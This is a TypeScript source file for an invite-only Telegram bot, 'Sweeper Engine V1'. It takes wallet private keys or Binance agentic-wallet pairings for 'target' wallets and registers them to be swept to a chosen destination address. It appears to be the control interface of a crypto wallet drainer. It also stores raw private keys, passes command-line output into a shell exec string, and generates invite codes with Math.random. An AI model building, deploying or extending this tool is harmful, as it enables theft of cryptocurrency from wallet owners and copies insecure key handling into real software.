import { Telegraf } from 'telegraf';
import { privateKeyToAccount } from 'viem/accounts';
import { inviteOnlyGuard, adminGuard } from './middleware';
import { mainDashboardKeyboard, adminPanelKeyboard } from './keyboards';
import { addSweepTarget } from '../engine/storage';
import { redis } from '../config/db';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export const setupBot = (token: string) => {
    const bot = new Telegraf(token);

    bot.catch((err, ctx) => {
        console.error(`[Bot Error] for ${ctx.updateType}:`, err);
    });

    bot.use(inviteOnlyGuard);

    bot.start(async (ctx) => {
        await ctx.reply(
            "⚡️ *Sweeper Engine V1*\n\nEngine is online. Dual-Mode routing active.", 
            { parse_mode: 'Markdown', ...mainDashboardKeyboard }
        );
    });

    bot.command('admin', adminGuard, async (ctx) => {
        await ctx.reply("🛡 *Admin Control Panel*", { 
            parse_mode: 'Markdown', 
            ...adminPanelKeyboard 
        });
    });

    bot.command('add', async (ctx) => {
        const userId = ctx.from?.id;
        const messageText = ctx.message.text;
        const parts = messageText.split(' ');

        if (parts.length !== 3) {
            return ctx.reply("⚠️ Format: `/add <private_key> <destination_address>`", { parse_mode: 'Markdown' });
        }

        const rawPrivateKey = parts[1];
        const destinationAddress = parts[2];
        const privateKey = rawPrivateKey.startsWith('0x') ? rawPrivateKey : `0x${rawPrivateKey}`;

        try {
            const account = privateKeyToAccount(privateKey as `0x${string}`);
            const targetAddress = account.address;

            await addSweepTarget(userId!, targetAddress, destinationAddress, privateKey, false);

            await ctx.reply(`✅ *Private Key Wallet Added*\n\n🎯 Target: \`${targetAddress}\`\n🏦 Destination: \`${destinationAddress}\``, { parse_mode: 'Markdown' });
            await ctx.deleteMessage(ctx.message.message_id).catch(() => {});
        } catch (error) {
            console.error(error);
            await ctx.reply("❌ Invalid private key or address format.");
        }
    });

    bot.command('link_agent', async (ctx) => {
        const userId = ctx.from?.id;
        const messageText = ctx.message.text;
        const parts = messageText.split(' ');

        if (parts.length !== 2) {
            return ctx.reply("⚠️ Format: `/link_agent <destination_address>`", { parse_mode: 'Markdown' });
        }

        const destinationAddress = parts[1];
        await ctx.reply("🔗 *Initializing Binance Agentic Wallet Pairing...*", { parse_mode: 'Markdown' });

        try {
            const { stdout } = await execAsync('npx @binance/agentic-wallet auth signin --json');
            const res = JSON.parse(stdout);

            if (res.success && res.data?.urlForWeb) {
                const { urlForWeb, pairingCode, qrCodeId, address: targetAddress } = res.data;
                
                await ctx.reply(
                    `🔐 *Binance Agentic Wallet Pairing*\n\n` +
                    `1. Confirm 6-character pairing code: \`${pairingCode}\`\n` +
                    `2. Enable *Secure Auto Sign* in your Binance App.\n\n` +
                    `[Authorize in Binance App](${urlForWeb})`,
                    { parse_mode: 'Markdown' }
                );

                const verifyOut = await execAsync(`npx @binance/agentic-wallet auth verify --qrCodeId ${qrCodeId} --json`);
                const verifyRes = JSON.parse(verifyOut.stdout);

                if (verifyRes.success) {
                    const resolvedAddress = targetAddress || verifyRes.data.address;
                    await addSweepTarget(userId!, resolvedAddress, destinationAddress, '', true);
                    await ctx.reply(`✅ *Binance Agentic Wallet Linked Successfully!*\nTarget Address: \`${resolvedAddress}\``, { parse_mode: 'Markdown' });
                }
            }
        } catch (error) {
            console.error("Agent link error:", error);
            await ctx.reply("❌ Failed to initiate agent pairing. Ensure Developer Mode is active in your Binance App.");
        }
    });

    bot.action('ADD_TARGET', async (ctx) => {
        await ctx.answerCbQuery();
        await ctx.reply("To add a wallet, send either:\n\n1. `/add <private_key> <destination>`\n2. `/link_agent <destination>`", { parse_mode: 'Markdown' });
    });

    bot.action('GEN_INVITE', adminGuard, async (ctx) => {
        await ctx.answerCbQuery();
        const code = `BEE-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
        
        await redis.setex(`invite_code:${code}`, 86400, 'active');

        await ctx.editMessageText(
            `🔑 *New Invite Code Generated*\n\n` +
            `Code: \`${code}\`\n` +
            `Share this link with your user:\n` +
            `\`https://t.me/${ctx.botInfo?.username}?start=${code}\`\n\n` +
            `*(Expires in 24 hours, single-use)*`,
            { parse_mode: 'Markdown', ...adminPanelKeyboard }
        );
    });

    bot.action('MAIN_MENU', async (ctx) => {
        await ctx.answerCbQuery();
        await ctx.editMessageText(
            "⚡️ *Sweeper Engine V1*\n\nEngine is online. Dual-Mode routing active.",
            { parse_mode: 'Markdown', ...mainDashboardKeyboard }
        );
    });

    return bot;
};
